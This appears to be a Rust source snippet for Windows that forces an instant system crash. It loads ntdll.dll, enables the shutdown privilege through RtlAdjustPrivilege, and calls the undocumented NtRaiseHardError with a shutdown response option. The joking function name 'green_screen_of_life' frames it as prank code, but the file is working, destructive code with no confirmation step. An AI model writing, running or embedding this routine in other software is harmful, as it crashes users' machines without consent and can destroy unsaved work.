use std::{
    ffi::{c_ulong, c_ulonglong, CString},
    mem::transmute,
};

use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{NTSTATUS, STATUS_FLOAT_MULTIPLE_FAULTS},
        System::LibraryLoader::{GetProcAddress, LoadLibraryA},
    },
};
type RtlAdjustPrivilige = unsafe extern "C" fn(
    privilge: c_ulong,
    enable: bool,
    currentThread: bool,
    enabled: *mut bool,
) -> NTSTATUS;
type NtRaiseHardError = unsafe extern "C" fn(
    errorStatus: NTSTATUS,
    numberOfParams: c_ulong,
    unicodeStrParamMask: c_ulong,
    params: *const c_ulonglong,
    responseOption: c_ulong,
    response: *mut c_ulong,
) -> i64;

macro_rules! make_pcstr {
    ($str:expr) => {
        PCSTR::from_raw(CString::new($str).unwrap().as_ptr() as *const u8)
    };
}

pub fn green_screen_of_life() {
    unsafe {
        let hndl = LoadLibraryA(make_pcstr!("ntdll.dll")).expect("ntdll to exist");
        let adjust_priv: RtlAdjustPrivilige = transmute(
            GetProcAddress(hndl, make_pcstr!("RtlAdjustPrivilege"))
                .expect("RtlAdjustPrivilige to exist"),
        );
        let raise_hard_err: NtRaiseHardError = transmute(
            GetProcAddress(hndl, make_pcstr!("NtRaiseHardError"))
                .expect("NtRaiseHardError to exist"),
        );

        let mut lol: c_ulong = 0;
        let mut enabled = false;
        adjust_priv(19, true, false, &mut enabled);
        println!("Enabled: {}", enabled);
        raise_hard_err(
            STATUS_FLOAT_MULTIPLE_FAULTS,
            0,
            0,
            std::mem::zeroed(),
            6,
            &mut lol,
        );
    }
}
